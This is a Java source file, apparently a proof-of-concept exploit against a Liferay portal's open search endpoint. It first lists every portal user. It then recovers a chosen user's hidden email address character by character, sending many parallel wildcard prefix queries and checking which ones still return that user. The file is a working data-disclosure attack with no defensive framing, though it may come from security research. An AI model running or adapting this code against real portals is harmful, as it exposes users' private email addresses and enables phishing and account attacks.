package nl.orange11.liferay;

import com.sun.syndication.feed.synd.SyndEntry;
import com.sun.syndication.feed.synd.SyndFeed;
import com.sun.syndication.io.FeedException;
import com.sun.syndication.io.SyndFeedInput;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.methods.GetMethod;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static java.lang.String.format;

public class Main {

    private static final Logger LOGGER = LoggerFactory.getLogger(Main.class);

    private static final Pattern TITLE_PATTERN = Pattern.compile("^Users and Organizations Â» (.*)$");
    private static final Pattern LINK_PATTERN = Pattern.compile(".*_125_p_u_i_d=(.*)$");

    private static final String LIFERAY_HOST = "localhost";
    private static final int LIFERAY_PORT = 8080;

    public static final int THREAD_POOL_SIZE = 50;

    public static void main(String... args) throws Exception {

        LOGGER.info("Fetching all users");

        List<User> users = fetchAllUsers();

        LOGGER.info("Users in the portal :");

        for (User user : users) {
            LOGGER.info("{}) {}", user.userId, user.fullname);
        }

        LOGGER.info("Enter the id of the user who's email you want to retrieve");

        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));

        String input;
        while (!isSelectableUserId(input = reader.readLine(), users)) {
            LOGGER.info("Not a valid selection");
        }

        long userId = Long.parseLong(input);

        LOGGER.info("Retrieving user email, this might take a while");
        String email = fetchUserEmail(userId);

        LOGGER.info("Found the email : " + email);

    }

    private static boolean isSelectableUserId(String input, List<User> users) {
        for (User user : users) {
            if (String.valueOf(user.userId).equals(input)) {
                return true;
            }
        }
        return false;
    }

    private static String fetchUserEmail(long userId) throws InterruptedException, ExecutionException {

        final ExecutorService executorPool = Executors.newFixedThreadPool(THREAD_POOL_SIZE);

        final CompletionService<String> completionService =
                new ExecutorCompletionService<String>(executorPool);

        CharacterGenerator characterGenerator = new CharacterGenerator();

        int taskCount = 0;
        String result = "";
        try {
            while (true) {

                while (taskCount < THREAD_POOL_SIZE) {
                    if (!characterGenerator.hasNext()) {
                        break;
                    }
                    String candidate = new StringBuilder(result)
                            .append(characterGenerator.next())
                            .toString();
                    completionService.submit(new FetchUserEmailCallable(candidate, userId));
                    taskCount++;
                }

                if (!characterGenerator.hasNext() && taskCount == 0) {
                    return result;
                }

                String taskResult = completionService.take().get();

                taskCount--;

                if (taskResult != null) {

                    LOGGER.debug("Got a new letter : " + taskResult);

                    result = taskResult;
                    characterGenerator.reset();
                }

            }
        } finally {
            executorPool.shutdown();
        }
    }


    private static class FetchUserEmailCallable implements Callable<String> {

        private final String emailAddressPart;
        private final long userId;

        private FetchUserEmailCallable(String emailAddressPart, long userId) {
            this.emailAddressPart = emailAddressPart;
            this.userId = userId;
        }

        @Override
        public String call() throws Exception {

            List<User> users = fetchUsers(format("emailAddress:%s*", emailAddressPart));

            for (User user : users) {
                if (user.userId == userId) {
                    return emailAddressPart;
                }
            }
            return null;
        }
    }

    private static List<User> fetchAllUsers() throws IOException, FeedException {
        return fetchUsers("entryClassName:com.liferay.portal.model.User");
    }

    private static List<User> fetchUsers(String keywords) throws IOException, FeedException {
        HttpClient client = new HttpClient();

        GetMethod method = new GetMethod(format("http://%s:%d/c/search/open_search" +
                "?p=1&c=5000&keywords=%s", LIFERAY_HOST, LIFERAY_PORT, keywords));

        try {
            client.executeMethod(method);
            String response = method.getResponseBodyAsString();
            return parseFeed(response);
        } finally {
            method.releaseConnection();
        }
    }

    private static List<User> parseFeed(String xml) throws FeedException {

        SyndFeedInput input = new SyndFeedInput();

        SyndFeed feed = input.build(new StringReader(xml));

        @SuppressWarnings("unchecked")
        List<SyndEntry> entries = feed.getEntries();

        List<User> result = new ArrayList<User>(entries.size());

        for (SyndEntry entry : entries) {
            long userId = getUserIdFromLink(entry.getLink());
            String fullname = getFullnameFromTitle(entry.getTitle());

            result.add(new User(userId, fullname));
        }
        return result;
    }

    private static String getFullnameFromTitle(String title) {
        Matcher titleMatcher = TITLE_PATTERN.matcher(title);
        if (titleMatcher.matches()) {
            return titleMatcher.group(1);
        } else {
            throw new IllegalArgumentException("Not a proper title");
        }
    }

    private static long getUserIdFromLink(String link) {
        Matcher linkMatcher = LINK_PATTERN.matcher(link);
        if (linkMatcher.matches()) {
            return Long.parseLong(linkMatcher.group(1));
        } else {
            throw new IllegalArgumentException("Not a proper link");
        }
    }

    private static class User {
        public final long userId;
        public final String fullname;

        private User(long userId, String fullname) {
            this.userId = userId;
            this.fullname = fullname;
        }
    }

    private static class CharacterGenerator {

        private static final String CHARACTERS = "@abcdefghijklmnopqrstuvwxyz0123456789.";

        private int count = 0;

        public char next() {
            return CHARACTERS.charAt(count++);
        }

        public boolean hasNext() {
            return CHARACTERS.length() > count;
        }

        public void reset() {
            count = 0;
        }
    }
}
